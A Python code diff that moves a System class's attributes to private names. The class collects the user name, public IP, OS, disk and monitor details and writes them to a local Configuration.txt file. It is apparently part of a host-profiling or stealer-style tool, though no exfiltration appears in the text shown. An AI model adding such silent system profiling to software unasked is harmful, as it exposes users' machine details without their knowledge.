@@ -14,14 +14,15 @@ class System:
 
     def __init__(self, storage_path: str, folder: str, errors: bool):
 
-        self.config = SystemConfig()
-        self.storage_path = storage_path
-        self.folder = folder
-        self.errors = errors
+        self.__storage_path = storage_path
+        self.__folder = folder
+        self.__errors = errors
+
+        self.__config = SystemConfig()
 
     def __create_folder(self):
 
-        storage_path = rf"{self.storage_path}\{self.folder}"
+        storage_path = rf"{self.__storage_path}\{self.__folder}"
 
         if not path.exists(storage_path):
             mkdir(storage_path)
@@ -115,14 +116,14 @@ class System:
     def __get_ip(self):
 
         try:
-            return urlopen(Request(method="GET", url=self.config.IPUrl)).read().decode("utf-8")
+            return urlopen(Request(method="GET", url=self.__config.IPUrl)).read().decode("utf-8")
         except:
             return "Unknown"
 
     def __get_system_info(self):
 
         user32 = windll.user32
-        data = self.config.SystemData
+        data = self.__config.SystemData
 
         net_info = self.__get_ip()
         machine_type = platform.machine()
@@ -134,10 +135,10 @@ class System:
         disk_info = self.__get_disks_info()
         monitors_info = f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"
 
-        with open(rf"{self.storage_path}\{self.folder}\Configuration.txt", "a", encoding="utf-8") as system:
+        with open(rf"{self.__storage_path}\{self.__folder}\Configuration.txt", "a", encoding="utf-8") as system:
 
             system.write(data.format(
-                self.config.User,
+                self.__config.User,
                 net_info,
                 machine_type,
                 os_info,
@@ -157,4 +158,4 @@ class System:
             self.__get_system_info()
 
         except Exception as e:
-            if self.errors is True: print(f"[System]: {repr(e)}")
+            if self.__errors is True: print(f"[System]: {repr(e)}")
